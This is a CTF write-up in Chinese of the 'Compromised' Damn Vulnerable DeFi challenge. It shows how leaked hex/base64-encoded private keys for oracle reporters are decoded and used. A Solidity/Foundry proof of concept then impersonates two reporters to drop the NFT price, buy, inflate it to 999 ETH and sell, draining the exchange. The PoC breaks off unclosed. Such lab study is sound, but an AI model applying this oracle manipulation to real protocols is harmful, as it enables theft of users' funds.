# Compromised (24/09/06)

## 题目介绍

> **妥协的**
>
> **在浏览该领域最受欢迎的DeFi项目之一的网络服务时，您会从服务器那里得到一个奇怪的响应。这是一个片段：**
>
> ```
> HTTP/2 200 OK
> content-type: text/html
> content-language: en
> vary: Accept-Encoding
> server: cloudflare
> 
> 4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30
> 
> 4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
> ```
>
> **一家相关的链上交易所正在出售名为“DVNFT”的（价格高得离谱）收藏品，现在每件售价为999 ETH。**
>
> **此价格来自链上神谕，基于3名受信任的记者：0x188...088，0xA41...9D8和0xab3...a40。**
>
> **从只有0.1 ETH的余额开始，通过拯救交易所中所有可用的ETH来通过挑战。然后将资金存入指定的回收账户。**

## 合约分析

根据题目的相关介绍这道题的突破肯定跟价格预言机有关系的。整个挑战总共有两个主要的文件`Exchange`和`TrustfulOracle`

我们最后想要挑战成功的话有三个条件，第一交易所没有余额，第二恢复账户有*EXCHANGE_INITIAL_ETH_BALANCE*金额，第三玩家不能拥有任何nft，第四价格没有变动。Exchange合约就两个函数买和卖，然后TrustfulOracle合约就是问题所在，我们通过某种方法修改价格最后完成攻击。

``` solidity
    function buyOne() external payable nonReentrant returns (uint256 id) {
        if (msg.value == 0) {
            revert InvalidPayment();
        }

        // Price should be in [wei / NFT]
        uint256 price = oracle.getMedianPrice(token.symbol());
        if (msg.value < price) {
            revert InvalidPayment();
        }

        id = token.safeMint(msg.sender);
        unchecked {
            payable(msg.sender).sendValue(msg.value - price);
        }

        emit TokenBought(msg.sender, id, price);
    }

    function sellOne(uint256 id) external nonReentrant {
        if (msg.sender != token.ownerOf(id)) {
            revert SellerNotOwner(id);
        }

        if (token.getApproved(id) != address(this)) {
            revert TransferNotApproved();
        }

        // Price should be in [wei / NFT]
        uint256 price = oracle.getMedianPrice(token.symbol());
        if (address(this).balance < price) {
            revert NotEnoughFunds();
        }

        token.transferFrom(msg.sender, address(this), id);
        token.burn(id);

        payable(msg.sender).sendValue(price);

        emit TokenSold(msg.sender, id, price);
    }
    
    //预言机修改价格函数
    
    function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) {
        _setPrice(msg.sender, symbol, newPrice);
    }

```



## 解题过程

1.根据题目给出的响应码的参数我们可以我发现他是16进制的，然后我们通过CyberChef的from hex 进行解码以后发现他是base64编码特征，在通过base64编码我们就可以发现他是一组32字节的长度的私钥。

2.根据题目我们把两个16进制同样的执行操作然后转换成私钥。

3.通过foundry的` vm.addr`把私钥导入我们可以看到地址就是预言机的地址。

4.然后我们就可以通过`postPrice`改变nft价格，我们只有0.1 ether，价格降低到0.1两个地址同时进行降低操作。进行购买

5.最好然后拉高到999 ether，卖出。在恢复价格，把钱转到恢复地址。完成攻击

**POC**

``````solidity
    function attack()public payable{
       // 使用第一个私钥导入地址
        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        address compromisedAddress1 = vm.addr(privateKey1);
        // 使用第二个私钥导入地址
        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
        address compromisedAddress2 = vm.addr(privateKey2);
//降低价格
        vm.startPrank(compromisedAddress1);
        oracle.postPrice("DVNFT", 0.1 ether);
        vm.stopPrank();
        vm.startPrank(compromisedAddress2);
        oracle.postPrice("DVNFT", 0.1 ether);
        vm.stopPrank();

//购买
        exchange.buyOne{value: 0.1 ether}();
//抬升价格
        vm.startPrank(compromisedAddress1);
        oracle.postPrice("DVNFT", 999100000000000000000);
        vm.stopPrank();
        vm.startPrank(compromisedAddress2);
        oracle.postPrice("DVNFT", 999100000000000000000);
        vm.stopPrank();

        nft.approve(address(exchange), 0); 
//出售        
        exchange.sellOne(0);
        recovery.transfer(999 ether);
//恢复价格
        vm.startPrank(compromisedAddress1);
        oracle.postPrice("DVNFT", 999 ether);
        vm.stopPrank();
        vm.startPrank(compromisedAddress2);
        oracle.postPrice("DVNFT", 999 ether);
        vm.stopPrank();
        console.log("balnce",address(exchange).balance);
``````